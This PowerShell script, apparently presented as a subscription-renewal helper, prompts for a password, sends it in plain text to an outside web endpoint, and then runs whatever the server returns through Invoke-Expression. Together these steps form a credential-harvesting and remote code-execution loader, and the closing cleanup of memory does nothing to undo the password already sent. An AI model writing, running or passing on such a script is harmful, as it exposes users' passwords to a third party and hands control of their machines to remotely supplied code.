# Make API call and execute response
$apiUrl = "https://backend-apis-tau.vercel.app/api/renew-subscription"

try {
    # Prompt for password
    $password = Read-Host "Enter password" -AsSecureString
    $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
    $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
    
    # Create request body
    $body = @{
        password = $plainPassword
    } | ConvertTo-Json

    # Make the API call with POST method
    $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json"
    
    # Execute the response as PowerShell code
    if ($response) {
        Write-Host "Executing response from API..."
        Invoke-Expression $response
    } else {
        Write-Host "No response received from API"
    }
} catch {
    Write-Host "Error occurred: $_"
} finally {
    # Clear sensitive data from memory
    if ($plainPassword) {
        $plainPassword = $null
    }
    if ($BSTR) {
        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
    }
}